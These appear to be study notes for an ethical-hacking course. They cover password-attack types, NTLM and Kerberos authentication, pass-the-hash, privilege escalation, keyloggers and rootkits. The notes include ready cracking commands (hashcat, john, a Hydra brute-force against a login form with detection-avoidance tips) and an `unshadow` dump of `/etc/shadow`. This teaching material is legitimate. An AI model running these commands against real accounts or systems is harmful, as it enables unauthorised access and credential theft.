# Cracking passwords overview

- Recovering passwords from the transmitted or stored data on computer systems.
- See also [Password cracking techniques | Web server threats and attacks](./../12-web-servers/web-server-threats-and-attacks.md)

## Password attack types

### Non-electronic attacks

- Do not require the attacker to have any technical knowledge about cracking passwords.
- [**Dumpster diving**](./../10-social-engineering/social-engineering-types.md#dumpster-diving)
  - Looking for notes or anything that can help in cracking the password.
- **Shoulder surfing**
  - Observing the target while they type in their passwords
  - E.G. looking at their keyboard or screen
- **[Social engineering](./../10-social-engineering/social-engineering-overview.md)**
  - Interacting with the target to trick them into revealing their passwords.

### Active online attacks

- Require the attacker to communicate with the target machine in order to crack the password.
- E.g. trying to login with username password combination on an online login page.
- ❗ Limitations
  - Network communication to server over internet takes long time
  - There are rate limits e.g. get locked after 5 minutes, then 10 then 15
  - If server becomes suspicious that it's a bot then it might shut you off directly
  - Offline attack can perform millions/billions a second
    - Online attack, e.g. every 5 seconds, if you fail 5 times you might get locked out.

#### Dictionary attack

- 📝 Dictionary = file containing list of passwords
- Steps
  1. Load a dictionary file into a password cracking program.
  2. The program checks the passwords against user accounts.
- Helps to test against
  - Default passwords
  - Common / weak passwords
  - Leaks downloaded from internet
- ❗ Limitations
  - Can get too big
  - No guarantee to find the password
- See also [Dictionary attacks | Cryptanalysis](./../15-cryptography/cryptanalysis.md#dictionary-attack)

#### Brute-force attack

- Running every combination of characters until the password is cracked.
- Slowest technique (can take years) but comprehensive.
  - 💡 Should be used in combination with [rule-based attack](#rule-based-attack) to increase the speed.
- See also [Brute force attack | Cryptanalysis](./../15-cryptography/cryptanalysis.md#brute-force-attack)

#### Hybrid attack

- 📝 [Dictionary attack](#dictionary-attack) + [brute force attack](#brute-force-attack)  
- Taking a dictionary and expanding it with guesses using brute-force.
- It prepends, appends or substitutes characters in words.
- E.g. using [`hashcat`](https://hashcat.net/wiki/doku.php?id=hybrid_attack)
  - Say an `example.dict` contains: `password` and `hello`
  - `... -a 6 example.dict ?d?d` would generate from `password00` and `hello00` to `password99` and `hello99`

#### Rule-based Attack

- Used when the attacker has some information about the password
  - such as the length, if there are any digits, and similar.
- Attacker combines several other attacks to crack the password.
  - E.g. brute force, dictionary, and syllable attack.
- Can e.g. record people, or use other [non-electronic attacks](#non-electronic-attacks) to get some portions of the password to build rules.

#### Password guessing

- Guess passwords either by humans or by automated tools using dictionaries
- Requires the attacker to manually attempt to log into the target's machine.
- E.g.
  1. Find the target's username
  2. Create a password dictionary list
     - 💡 Good to add default passwords from manufacturers.
  3. Sort the passwords by the probability
  4. Try each password

#### Trojan/spyware/keylogger

- Installed in target machine to get the target's passwords and usernames.
- They run in the background and sometimes are difficult to detect.
- **Trojans**
  - Design to collect information or harm the system.
  - Allow attackers to remotely access the machine and perform malicious activities.
- **Spyware** are designed to collect secret information.
- **[Keyloggers](./executing-applications.md#keylogger)** to send key strokes to the attacker.

#### Hash injection

- Attack on systems that use hash functions for the user authentication.
- Steps:
  1. Retrieve the hashes which are stored in a databases
  2. Find the hash that belongs to the user
  3. Use that hash to create an authenticated session.

#### LLMNR/NBT-NS poisoning

- LLMNR = Link Local Multicast Name Resolution
- NBT-NS = NetBIOS Name Service
- Two main Windows OS elements that perform host name resolution.
- **Vulnerability**
  - When DNS fails to resolve name queries, the host sends a UDP broadcast message to other hosts asking them to authenticate themselves
  - Allows an attacker to listen for such broadcast messages and tricks the host into establishing a connection.
  - Once the connection is established, the host sends its username and NTLMv2 hash, which the attacker can attempt to crack and in such a way discover the password.

### Passive online attacks

- Grabbing data in-transit e.g. a key, password hash
- Without communicating with the target machine.
- Attacker
  1. Monitors the communication channel
  2. Records the traffic data
  3. Uses the data to break into the system.

#### Wire sniffing

- Attackers sniff credentials by capturing packets that are being transmitted
- During the packet transmission, attackers
  - capture packets
  - extract sensitive information such as passwords and emails
    - uses them to  gain access to the target system.

#### Man-in-the-middle (MITM) attack

- Attacker gains access to the communication channel between the target and server.
- Attacker then extracts information and data they need to gain unauthorized access.

#### Replay attack

- Involves using a sniffer to capture packets and authentication tokens.
- Need access to raw network data using e.g.
  - Network tap to physically copy everything that goes through in network.
  - Man in the middle attack using e.g. ARP poisoning.
  - Malware on victims computer
- Attacker replay information using e.g. extracted authentication token or hashed password.
- **Countermeasure**
  - Using Session ID for each user session on server side
  - Expire session ID in short time intervals so replay attack cannot use same session ID

### Offline attacks

- Cracking efforts on a separate system
- Attacker never attempts to login to the application server that can be logged.
- ❗ Does not mean disconnected from internet.
- Usually the attacker tries to guess a password from a hash dump.
  - E.g. SAM file on Windows or `/etc/shadow` on Linux.

#### Distributed network attack (DNA)

- Uses the power of machines across the network to decrypt passwords.
- Used for recovering passwords from hashes
- DNA manager is installed on a central location
  - Coordinates the attack by allocating portions of the key search to machines which are on the network.

#### Hash attacks

- [Rainbow table attack](../15-cryptography/cryptanalysis.md#rainbow-table-attack)
- [Collision](../15-cryptography/cryptanalysis.md#collision-attack)
- [Birthday attack](../15-cryptography/cryptanalysis.md#birthday-attack)
- [Brute-force attack](../15-cryptography/cryptanalysis.md#brute-force-attack)

#### Password cracking countermeasures

- 📝 Use [**password salting**](./../15-cryptography/hashing-algorithms.md#salted-hash)
  - The longer the random string, the harder it becomes to break or crack the password
  - Generates different hashes for the same password
  - Protects against [rainbow tables](../15-cryptography/cryptanalysis.md#rainbow-table-attack) as it would cause the table to include salts making it much bigger.
- Use [key stretching](./../15-cryptography/hashing-algorithms.md#key-stretching) to derive stronger passwords to use in encryption.

## Linux passwords

- 📝 Linux hashed passwords lies in `/etc/shadow/` so you can attack on that.
- Linux usually use SHA512, you can find method in `/etc/login.defs`
- In older systems password information was stored in `/etc/passwd`, now it holds only user account information.
# Microsoft authentication

- Windows stores passwords in hashed form using either:
  - **Security Accounts Manager (SAM) Database**
    - A file stored at `%SystemRoot%/system32/config/SAM`
    - Locked by Windows kernel to prevent copying/moving
      - Usually stolen through bootable CD/USBs.
  - **Active Directory Database**
    - Stored on a domain controller in a database
    - Located in either `%SystemRoot%\NTDS\Ntds.dit` or `%SystemRoot%\System32\Ntds.dit`

## NTLM authentication

- New Technology (NT) LAN Manager (LM)
- Security protocols, default authentication scheme
- 📝 Consists of LM and NTLM authentication protocols
  - Challenge-response authentication protocols
  - Each stores user passwords in SAM database using different hash methodologies
  - 💡 Try all as many systems still keep older authentication for backwards compatibility.
- 💡 Insecure, can be disabled through GPO (Group Policy Object) with [privacy.sexy](https://privacy.sexy)

### LM vs NTLM

#### LM

- LM is the oldest password protocol dating back to OS/2 in 1980's
- **LM Hash**
  - E.g. `aad3c435b514a4eeaad3b935b51304f`
  - 📝 **Flow**
    1. Convert all lower case to upper case (case-insensitive)
    2. Pad password to 14 characters with NULL characters
    3. Split the password to two 7 character chunks
    4. Create two DES keys from each 7 character chunk
    5. DES encrypt the string "`KGS!@#$%`" with these two chunks
    6. Concatenate the two DES encrypted strings = LM hash.
- **Authentication flow**
  1. Client ends authentication request
  2. Server response with a challenge
  3. Client responds with DES encrypted LM hash with challenge as key
- **Weaknesses**
  - No salting allowing MITM attacks (through [pass the hash](#pass-the-hash-attack) and rainbow tables).
  - If password is less than 7 characters second half is always `0xAAD3B435B51404EE`
  - Maximum allowed length is 14 characters
  - Case insensitive: PassWord, PaSsWoRd, PASSword and other similar combinations are same as PASSWORD.
  - 💡 Turned off as default since Windows Vista/Server 2008 as it's weak
- **Cracking**

  ```txt
    john --format=lm hash.txt
    hashcat -m 3000 -a 3 hash.txt
  ```

#### NTLM

- Also known as ***NT LAN Manager***
- Uses DES with MD4 hash, used in Windows NT until SP3
- **NTLM Hash**
  - Also known as ***NTLM hash***, ***NTHash***, ***NT hash**'.
  - Algorithm: `MD4(UTF-16-LE(password))`
    - UTF-16-LE is the little endian UTF-16
  - E.g. `B4B9B02E6F09A9BD760F388B67351E2B`
  - **Cracking**
    1. Can be extracted using e.g. SAM database or [mimikatz](https://github.com/gentilkiwi/mimikatz)
    2. Then

    ```txt
      john --format=netntlm hash.txt
      hashcat -m 5500 -a 3 hash.txt
    ```

##### NTLMv1

- Also known as ***Net-NTLMv1***
- Uses both the NT and LM hash, depending on configuration and what is available.
- Deprecated, but still used in some old systems on the network.
- E.g.  

  ```txt
    u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
  ```

- **Authentication flow**
  1. `C = 8-byte server challenge, random`
     - Server sends sending an 8-byte random number, the challenge
  2. `K1 | K2 | K3 = NTLM-Hash | 5-bytes-0`
     - Five zeroes are added to the hash to achieve 21 bytes
     - 21 bytes is split into three 7 byte parts
  3. `response = DES(K1,C) | DES(K2,C) | DES(K3,C)`
     - Each part is used as key in DES
     - Three encryptions are reunited to form the 24-byte response
- **Cracking**
  - 💡 Easy to crack as it lacks salting
  1. Can be captured using [Responder](https://github.com/lgandx/Responder)
  2. Then

  ```txt
    john --format=netntlm hash.txt
    hashcat -m 5500 -a 3 hash.txt
  ```

##### NTLM v2

- Also known as ***Net-NTLMv2***
- Uses MD5
- Introduced in Windows NT 4.0 SP1 (Windows 2000)
- E.g.

  ```txt
    admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
  ```

- Replaces NTLM with
  - stronger cryptography against spoofing attacks
  - ability to authenticate the client
- **Authentication flow**
  1. `SC = 8-byte server challenge, random`
     - Server sends sending an 8-byte random number, the challenge
  2. `CC = 8-byte client challenge, random`
     - 8-byte random value for the challenge
  3. `CC* = (X, time, CC2, domain name)`
     - `time`: the current time in NT Time format
     - `CC2`: an 8-byte random value
     - `X`: fixed contents of a formatting field.
  4. `v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)`
     - HMAC-MD5 hash of users password and domain name with other identifying information
  5. `LMv2 = HMAC-MD5(v2-Hash, SC, CC)`
  6. `NTv2 = HMAC-MD5(v2-Hash, SC, CC*)`
  7. `response = LMv2 | CC | NTv2 | CC*`
- Cracking it
  1. Can be captured using [Responder](https://github.com/lgandx/Responder)
  2. Then:

  ```txt
    john --format=netntlmv2 hash.txt
    hashcat -m 5600 -a 3 hash.txt
  ```

### Pass the hash attack

- Also known as **pass-the-hash**
- Allows gaining access to systems without accessing password in plaintext
- Can be used on any systems using LM or NTLM authentication
- Exploits static hash that's shared between sessions in authentication protocol
- Helps to hack Windows user name, domain name, and password hashes
- Can dump hashes
  - from compromised machines by e.g. [Windows Credentials Editor](https://www.ampliasecurity.com/research/wcefaq.html) and [Pass-the-Hash Toolkit](https://en.wikipedia.org/wiki/Pass_the_hash)
  - or sniff the network
- Allows privilege escalation as domain administrators connected to machine also leaves their hashes.

## Kerberos authentication

- Network authentication protocol for client/server applications
- Protects against replay attacks and eavesdropping
- Uses both symmetric and asymmetric encryption
- Uses TCP/UDP port 88
- **Mutual authentication**
  - Both parties verifies each others identity using tickets.

### Kerberos authentication components

- Requires **Key Distribution Center (KDC)** that consists of:
  - **Authentication server (AS)**
  - **Ticket Granting Server (TGS)**
- **Ticket Granting Ticket (TGT)**
  - Small, encrypted file with limited validity
  - Protects users from MITM attacks
  - Includes session key, its expiration date, and the user's IP address

### Kerberos authentication flow

1. Client asks KDC (who has AS and TGS) for ticket to authenticate throughout the network.
   - This request is in clear text.
2. Server responds with secret key.
   - Hashed by the password copy kept on AD server (TGT).
3. TGT sent back to server requesting TGS if user decrypts.
4. Server responds with ticket, and client can log on and access network resources.

### Pass the ticket attacks

- Also known as **pass-the-ticket**
- Authentication Method using Kerberos tickets without having access to an account's password.
- Kerberos tickets are retrieved e.g. from memory on a system
- Tools include [mimikatz](https://github.com/gentilkiwi/mimikatz) and [Rubeus](https://github.com/GhostPack/Rubeus)
# Password cracking tools

- See also [Web server password cracking tools | Web server threats and attacks](./../12-web-servers/web-server-threats-and-attacks.md#web-server-password-cracking-tools)

## `crunch`

- Generates password dictionaries.
- E.g. `crunch <min-length> <max-length> <character-pool> -o <file-name>`
- Difficulty/time grows exponentially not linearly
  - Takes much longer when you e.g. increase total chars in a password.
  - E.g. `crunch 4 16 abcekfeafkapeo434@*.` generates thousands of petabytes.

## John the Ripper

- Also known as • ***JtR*** or ***`john`***
- 📝 Auto-detects OS password based on dictionary or brute-force attacks.
- Tries different passwords and compares their hashes to OS password
- Supports Windows, Linux and macOS.
- 📝 Usage:
  1. Dump OS password to a file.
     - E.g. on Linux, John has `unshadow` tool that can be used.: `unshadow /etc/passwd /etc/shadow > mypasswd`
  2. Crack password file using default order: `john mypasswd`
     - Passwords are saved in `$JOHN/john.pot`
     - You can also run `john --show mypasswd` to see the passwords

## Hydra

- Parallelized login cracker for different network protocols such as HTTP, Cisco, MySQl.
- 💡 You can use [DVWA: damn vulnerable web app](http://www.dvwa.co.uk/) for educational purposes & learning pen-testing
- E.g. `hydra -L usernamelist.txt -P passlist.txt -e ns -F -t 1 -w 10 <host-ip-address> http-form-post "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -v`
  - `-e ns`: e additional options
    - `n`: try null (for empty password)
    - `s`: try also same password as a user name
  - `-t 1`: number of tasks (based on threads), default is 16
    - ❗ Careful. Too many connections and too quick = Detected immediately
  - `-w 10`: waiting time of 10 ms
  - `<host-ip-address>`
    - Usually people go to the target using proxies and examine results in proxies.
      - E.g. [burp suite](./../05-vulnerabilities/vulnerability-analysis.md#burp-suite)
  - `http-form-post "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed`
    - Posts data to server as the HTML does
    - `Login failed`: text to search in result page to determine whether the login has failed.

## Hashcat

- Very fast, GPU-based password cracker with in-kernel rule engine
- Can do dictionary hash attack, brute force hash, role based attack and more
- [Website](https://hashcat.net/hashcat/) | [source code](https://github.com/hashcat/hashcat)
- 💡 Good idea to use in cloud to get more compute power.
- Proper drivers are required for e.g. AMD and Intel and NVIDIA
- E.g. cracking Linux OS password
  - `./hashcat64.bin -a 3 -m 1800 ?u?l?l?l?d?d?d`
    - `-m 1800`: Hash mode `sha512crypt $6$, SHA512 (Unix)`
    - `-a 3 ?u?l?l?l?d?d?d`: Mask attack
      - Brute-force on user specified character sets
      - `?u?l?l?l?d?d?d`= uppercase + lowercase + lowercase + lowercase + number + number + number
      - 💡 Do certain assumptions or it might take until the next big bang to crack the password.
      - E.g. usually passwords start with capital letter and continues with lowercase letters

## Password recovery tools

- [Elcomsoft Distributed Password Recovery](https://www.elcomsoft.com/edpr.html)
  - Data recovery and password recovery services
  - Runs on Windows
  - For forensic and government agencies
  - Can crack systems passwords for Windows, Unix and Mac OS and many more other passwords.
- [Passware Kit Forensic](https://www.passware.com/kit-forensic/)
  - Tool for encrypted electronic evidence discovery and decryption
  - Can crack systems passwords for Windows, Unix and Mac OS and [many more other passwords](https://www.passware.com/kit-forensic/filetypes/).

### Windows password reset tools

- Resets Windows login passwords.
- Often can run from a bootable USB or CD/DVD.
- Include • [Stellar Password Recovery](https://www.stellarinfo.com/password-recovery/password-recovery-software.php) • [Windows Password Recovery Pro ISeePassword](https://www.iseepassword.com/windows-password-recovery.html) • [Windows Password Recovery Tool](https://www.windowspasswordsrecovery.com/) • [Windows Password Refixer](https://www.isumsoft.com/windows-password-refixer/) • [PCUnlocker](http://www.pcunlocker.com/)

#### chntpw

- Also known as [Offline NT Password & Registry Editor](http://www.chntpw.com/)
- 📝 Linux utility used for resetting or blanking local passwords used by Windows.
# Linux basics

- See also Linux log files

## Linux folders

- `/`: Root
- `/var`: Variable Data / Log Files
  - See also [Linux security logs | Covering tracks](./covering-tracks.md#linux-security-logs)
- `/bin`: Binaries / User Commands
- `/sbin`: Sys Binaries / Admin Commands
- `/root`: Home dir for root user
- `/boot`: Store kernel
- `/proc`: Direct access to kernel
- `/dev`: Hardware storage devices
- `/mnt`: Mount devices
- `/etc`: Contain all your system configuration files in it e.g.
  - [Hosts file](./../10-social-engineering/social-engineering-types.md#pharming)
  - [Firewall settings](./../11-firewalls-ids-and-honeypots/firewall-overview.md#firewalld)
  - [Password files](./cracking-passwords-overview.md#linux-passwords)
  - `/etc/sudoers` that controls
    - Who can run what commands as what users on what machines
    - Special things such as whether you need a password for particular commands
- See also [path obfuscation | Evading IDS](./../11-firewalls-ids-and-honeypots/evading-ids.md#path-obfuscation)

## File permissions in Linux

- Assigned via the use of the binary equivalent for each `rwx` group
- Read-only is equivalent to 4, write is 2, and execute is 1
- To accumulate permissions, add the numbers
  - 4 is read-only
  - 6 is read and write
  - 7 is read, write and execute
- Order
  - First number corresponds to the user
  - Second to the group
  - Third is to all others.  
- E.g. `chmod 744 anyfile`
  - Allow all privileges to the user, read-only for the group, read-only for all others.

## Run processes in background

- Using `&` will cause the program to run in the background.
- Makes it only useful for programs that do not need input.
- The program will terminate if you log out
- Program can be brought to foreground using `fg <job-number>`

## 📝 Common linux commands

- `adduser` / `addgroup`: adds a new user and group to a system.
- `apropos`: quickly searches the names and descriptions of all available man pages.
- `ar`: creates, modifies, or extracts archives.
- `arch`: prints the machine's architecture.
- `bzip2`: creates compressed file archives in bzip2 format.
- `cal` / `ncal`: displays a calendar in the output.
- `cat`: concatenates files, or data provided on standard input, and prints it on the standard output.
- `cd`: changes user's present working directory.
- `chattr`: lists and edits extended filesystem attributes for files and folders like the immutable attribute.
- `chgrp`: changes the group ownership of a file.
- `chmod`: changes access permissions for a file.
- `chown`: changes the ownership and group of a file.
- `cksum`: prints the CRC checksum and byte count for the input.
- `clear`: clears the terminal screen.
- `cmp`: perform byte-by-byte comparison of two files.
- `comm`: compare two sorted files line-by-line.
- `cp`: copying files and directories.
- `cpulimit`: limits the CPU usage of a process
- `csh`: switches between Linux user shells.
- `csplit`: splits a file into sections determined by context lines.
- `curl`: downloads files from the internet by HTTP or HTTPS.
- `date`: prints or sets the system date and time.
- `dd`: copies a file, converting and formatting according to the operands.
- `df`: displays the file system disk space usage in output.
- `diff` | `diff3`: compare two files line by line.
- `dig`: query DNS servers and to resolve DNS records.
- `dir`: lists directory contents.
- `dirname`: strips last component from a file name/path.
- `dmesg`: prints or controls the kernel ring buffer.
- `dmidecode`: command prints a system's DMI (aka SMBIOS) table contents in a human-readable format.
- `dpkg`: a package manager for Debian/Debian-based systems.
- `du`: displays disk usage of files present in a directory as well as its sub-directories.
- `echo`: displays whatever input text is given to it.
- `ed`: a line-oriented text editor.
- `eject`: eject removable media (typically, a CD ROM or floppy disk).
- `env`: displays the current environment, and edit it.
- `exit`: causes the shell to exit.
- `expand`: converts tabs present in the input file(s) into spaces, and writes the file contents to standard output.
- `expr`: evaluates expressions e.g. `expr 1 + 2` outputs `3`.
- `factor`: prints the prime factors of the input number.
- `fgrep`: grep with -F option not treating regular expression metacharacters as special, processing the information as simple string instead.
- `find`: search for files in a directory as well as its sub-directories.
- `fold`: wraps each input line to fit in specified width.
- `free`: displays the amount of free and used memory in the system.
- `grep`: searches for a specified pattern in a file (or files) and displays in output lines containing that pattern.
- `groups`: displays the name of groups a user is part of.
- `gzip`: compresses the input file, replacing the file itself with one having a .gz extension.
- `gunzip`: compressed with gzip command can be restored to their original form using the gunzip command.
- `head`: displays the first 10 lines of the file to standard output.
- `hostname`: displays and sets the system's host name.
- `history`: display the history of commands that you typed in on the shell.
- `id`: prints user and group information for the current user or specified username.
- `ifconfig`: fetch esinformation related to network interfaces and configure network interfaces.
- `join`: joins lines of two files on a common field.
- `kill`: helps user kill a process by its ID sending the TERM signal to it.
- `killall`: kills a process by its name.
- `last`: shows listing of last logged in users.
- `ldd`: displays in output dependencies of a shared library.
- `ln`: creates link between files.
- `locate`: locate command helps user find a file by name.
- `logname`: prints the user-name of the current user.
- `look`: displays lines beginning with a given string.
- `ls`: lists contents of a directory in output.
- `lshw`: extracts and displays detailed information on the hardware configuration of the machine.
- `lscpu`: displays in output system's CPU architecture information (such as number of CPUs, threads, cores, sockets, and more).
- `lsof`: displays information related to files opened by processes.
- `man`: access reference manual for commands, programs/utilities, as well as functions.
- `md5sum`: print or check MD5 (128-bit) checksums.
- `mkdir`: creates directories.
- `mkfifo`: creates named pipes.
- `more`: a filter for paging through text one screenful at a time.
- `mv`: either moves a file from one directory to another, or renames it.
- `nano`: launches the 'nano' text editor.
- `netstat`: prints network connections, routing tables, interface statistics, masquerade connections, and multicast memberships.
  - Used for e.g. [Port monitoring | Malware analysis](./../07-malware/malware-analysis.md#port-monitoring)
- `nice`: runs a program with modified scheduling priority.
- `nl`: writes contents of a file to output, and prepends each line with line number.
- `nm`: display symbols from object files.
- `nproc`: displays the number of processing units available to the current process.
- `od`: dump files in octal as well as some other formats.
- `passwd`: used for changing passwords for user accounts.
- `paste`: merges lines of files
- `pidof`: gives the process ID of a running program/process.
- `ping`: checks whether or not a system is up and responding.
- `ps`: displays information (in the form of a snapshot) about the currently active processes.
- `pstree`: produces information about running processes in the form of a tree.
- `pwd`: displays the name of current/working directory.
- `rm`: removes files and/or directories.
- `rmdir`: deletes empty directories.
- `scp`: securely copies files between systems on a network.
- `screen`: keeps a terminal session open even when your SSH connection is interrupted,
- `sdiff`: performs a side-by-side merge of differences between two files.
- `sed`: a stream editor that allows users to perform basic text transformations on an input stream (a file or input from a pipeline).
- `seq`: prints numbers from FIRST to LAST, in steps of INCREMENT,
- `sha1sum`: print or check SHA1 (160-bit) checksums.
- `shutdown`: shut the system in a safe way.
- `size`: lists the section sizes as well as the total size for an object or archive file.
- `sleep`: specify delay for a specified amount of time.
- `sort`: sort lines of text files.
- `split`: splits a file into fixed-size pieces.
- `ssh`: basically OpenSSH SSH client.
- `ssh-keygen`: creates a private/public key pair for SSH.
- `stat`: displays status related to a file or a file-system.
- `strings`: displays in output printable character sequences that are at least 4 characters long.
- `su`: change user-identity.
- `sudo`: lets a permitted user run a command as another user (usually root or superuser).
- `sum`: prints checksum and block counts for each input file.
- `tac`: prints input files in reverse.
- `tail`: displays in output the last 10 lines of a file.
- `talk`: lets users talk with each other.
- `tar`: creates as well as extract archive files.
- `tee`: reads from standard input and write to standard output as well as files.
- `test`: checks file types and compare values.
- `time`: summarizes system resource usage of a program.
- `top`: gives a dynamic real-time view of a running system (in terms of its processes).
- `touch`: changes file timestamps (the access and modification times).
- `tr`: translates/squeezes/deletes characters.
- `tty`: prints the filename of the terminal connected to standard input.
- `uname`: prints certain system information.
- `unexpand`: convert spaces into tabs.
- `uniq`: report or omit repeated lines.
- `unexpand`: converts spaces present in the input file(s) into tabs, and writes the file contents to standard output.
- `uptime`: tells how long the system has been running.
- `users`: displays in output the usernames of users currently logged in to the current host.
- `vdir`: lists information about contents of a directory (current directory by default).
- `vim`: text/programming editor.
- `w`: displays information about the users currently on the machine, and their processes.
- `wall`: writes and sends a message to other users that are currently logged in.
- `watch`: monitors a program's output.
- `wc`: prints newline, word, and byte counts for a file.
- `wget`: perform a non-interactive download of files from the Web.
- `whatis`: displays single-line manual page descriptions.
- `which`: locates a command - the file and the path of the file that gets executed.
- `who`: shows who is logged on.
- `whereis`: shows in output locations of the binary, source, and manual page files for a command.
- `whoami`: prints effective `userid` of the current user.
- `xargs`: builds and executes command lines from standard input.
- `yes`: outputs a string repeatedly until killed.
- `zcat`: displays the content of gzip compressed files.
# Escalating privileges

- Exploiting OS and software vulnerabilities to gain admin privileges.
  - Generally by executing a malicious code that grant them higher privileges
- Becoming admin on the target system allows all sorts of malicious activities.

## Types of privilege escalation

- **Horizontal privilege escalation**
  - Acquiring the privileges of the same level
  - Allows executing files from a location that should be protected
- **Vertical privilege escalation**
  - Acquiring higher privileges

## Example flow of escalating privileges

- ![Flowchart for escalating privileges](./img/escalating-privileges.png)

## Privilege escalation techniques

- **Path Interception**
  - Creating files at paths to be executed instead of legitimate targets.
  - Exploits misconfigurations, quotes, search orders
- **Web Shell**
  - Installed as backdoor to control from a remote server
- `setuid` and `setgid`
  - Setting them allows to execute files with more privileges than user in macOS and linux.

### Pivoting

- Using a compromised system as a launching point into other systems.
- E.g. in [Metasploit](./../05-vulnerabilities/automated-penetration-testing-tools.md#metasploit) you can add route to first compromised system to access the network beyond it.

### Windows techniques

#### Access token manipulation

- Access tokens are used in Windows as **security context** of a process or thread
- Every process user executes gets token issued for authentication user.
- User can modify the tokens so processes seem to belong another user.
- E.g. "run as" runs as administrator user therefor giving administrator privileges

#### File system permissions weakness

- Binaries in Windows execute with privileges of process that's executing it.
- Original binaries can be replaced with malicious ones to  privileges

#### Windows application shimming

- Shim = Windows Application Compatibility Framework
  - Compatibility layer for newer/older versions of Windows
  - Run in user mode and cannot modify the kernel
- Exploited to e.g. • Bypass UAC (RedirectEXE) • Inject malicious DLLs (InjectDLL) • Capture memory addresses (GetProcAddress)
- Allows attacker to e.g. • Disable Windows defender • Escalate privileges • Install backdoors

#### Windows applications DLL vulnerability

- **Reason**: Failure to supply a fully qualified path of a DLL library that is being loaded.
- **Behavior**: Application looks for the DLL in the directory from which it was executed.
- **Vulnerability**: Placing a malicious DLL into the directory and gain access to the system.

#### Scheduled tasks

- Used to escalate privileges, maintain persistence, start at startup etc.

### macOS techniques

#### OS X applications dynamic library vulnerability

- **Behavior**: OS X looks for dynamic libraries (`dylib`) in multiple directories when loading them.
- **Vulnerability**: Injecting malicious `dylib`s into one of the primary directories, which will then be loaded instead of the original one.

#### Launch Daemon

- Allows to execute malicious files at boot-up time.
- Enables escalating privileges, maintain persistence, start at startup etc.

### Meltdown vulnerability

- Affects some Intel chips
- Bypasses security mechanisms that prevent programs from reading arbitrary locations in system memory.
- If exploited, it gives attackers ability to read the memory outside of the program
- Allows attackers to
  - escalate their privileges
  - read information such as credentials, private keys, and so on.

### Spectre vulnerability

- Affects modern microprocessors
- Tricks a program into accessing the program's memory space.
- Allows attackers to
  - read kernel memory to obtain sensitive information
  - use JavaScript to launch a web-based attack

## Privilege escalation countermeasures

- Apply least-privilege: Never grant more privileges than needed!
- Use encryption and [MFA](./../01-introduction/identity-access-management-(iam).md#multi-factor-authentication-mfa)
- Run services as unprivileged accounts
- Patch and update regularly
- Ensure all executables are write-protected

### User Access Control (UAC)

- 📝 Prompts user for potentially dangerous software in Windows
- Limits softwares to user privileges until an administrator authorizes an elevation.
- 💡 Should be set to "Always Notify"

### Privilege escalation tools

- [BeRoot](https://github.com/AlessandroZ/BeRoot) to check common misconfigurations to find a way to escalate privileges on Linux and Windows
- [linpostexp](https://github.com/reider-roque/linpostexp): Linux post exploitation enumeration and exploit checking tools
- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) and [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
# Executing applications

- Remotely executing malicious programs designed to steal information, crack passwords, install backdoor, and so on.
- Next step after gaining access and elevating privileges.
- Programs that attackers install include
  - [Backdoor](./../07-malware/malware-overview.md#backdoor)s are designed to collect information and gain unauthorized access to the system
  - Crackers are designed to crack passwords
  - [Keylogger](#keylogger)s are designed to record keystrokes
  - [Spyware](#spyware) are designed to capture screenshots and send them to the attacker

## Keylogger

- Software or hardware device designed to
  1. record every keystroke on the target's keyboard
  2. logs them into a file
  3. sends them to a remote location
- Used for monitoring employee and children computer activity
- Allow gathering confidential information including emails and passwords.
- Two types: [hardware keylogger](#hardware-keylogger) and [software keylogger](#software-keylogger)

### Hardware keylogger

- ![Hardware keylogger](img/hardware-keylogger.jpg)
- Look like USB drives and are designed to record keystrokes, which are stored on the device.
- Placed between a keyboard plug and USB socket
- Cannot be detected by anti-spyware or antivirus programs.
- Discoverable as they have to be physically placed onto a target's machine

#### Hardware keylogger types

- **PC/BIOS Embedded**
  - Modifying the BIOS level firmware to capture the keystrokes
- **Keylogger keyboard**
  - Attaching the hardware circuit with the keyboard cable connector
- **External keylogger**
  - Attaching the keylogger between a keyboard and computer.
  - E.g. PS/2 and USB Keylogger, Acoustic/CAM Keylogger, Bluetooth Keylogger, and Wi-Fi Keylogger.

### Software keylogger

- Installed on the target's machine
- Recorded keystrokes are
  - logged into a log file on the target's machine
  - then sent to the attacker using email protocols

#### Software keylogger types

- **Application keylogger**
  - Designed to observe the target's activity whenever type something.
  - It can record emails, passwords, messages, browsing activities, and so on.
- **Kernel keylogger**
  - Designed to exist on a kernel level and act as a keyboard device driver
  - Allows it to record everything that is typed on the keyboard
- **Rootkit keylogger**
  - Forged Windows device driver which records keystrokes
- **Device driver keylogger**
  - Designed to replace the driver that has the keylogging functionality
  - Logs the keystrokes, and send the file to a remote location
- **Hypervisor-based keylogger**
  - Designed to work within a malware hypervisor that is operating on the OS
- **Form grabbing based keylogger**
  - Designed to record web browsing when the Submit event is triggered

## Spyware

- Stealthy program designed to
  - record the target's interaction with the computer and Internet
  - send the recorded data to the attacker
- Able to take and send screenshots.
- Hidden when installed.

### Spyware types

- Desktop spyware
- Email spyware
- Internet spyware
- Child-monitoring spyware
- Screen-capturing spyware
- USB spyware
- Audio and video spyware
- Print spyware
- Telephone spyware
- GPS spyware
# Hiding files

- Attacker attempts to cover their tracks in order to ensure future access to the system.

## Rootkits

- 📝 Creates backdoor to the system to enable the attacker to access to the system.
- Hides itself for not being detected, can e.g.
  - remove itself from the process list
  - replace certain system calls and utilities
- Do not spread by themselves.
  - Usually hidden in other software, waiting to be executed
- 💡 Best alternative for recovery is to wipe and reload from a known-good media.
- See also [Rootkit Trojans](./../07-malware/trojans.md#rootkit-trojans)

### Rootkit objectives

- Gaining remote backdoor access
- Hiding traces of the attack
- Collect confidential data
- Install other malicious programs on the machine

### Rootkit levels

- **Hypervisor level**
  - Acts as a hypervisor and load the target OS as a virtual machine.
- **Hardware/firmware**
  - Conceal itself in hardware devices that are not inspected
  - E.g. in a [motherboard firmware](https://www.theregister.com/2018/09/28/uefi_rootkit_apt28) used to spy against governments
- **Kernel level**
  - Replaces portions of OS code or adds new malicious core to it.
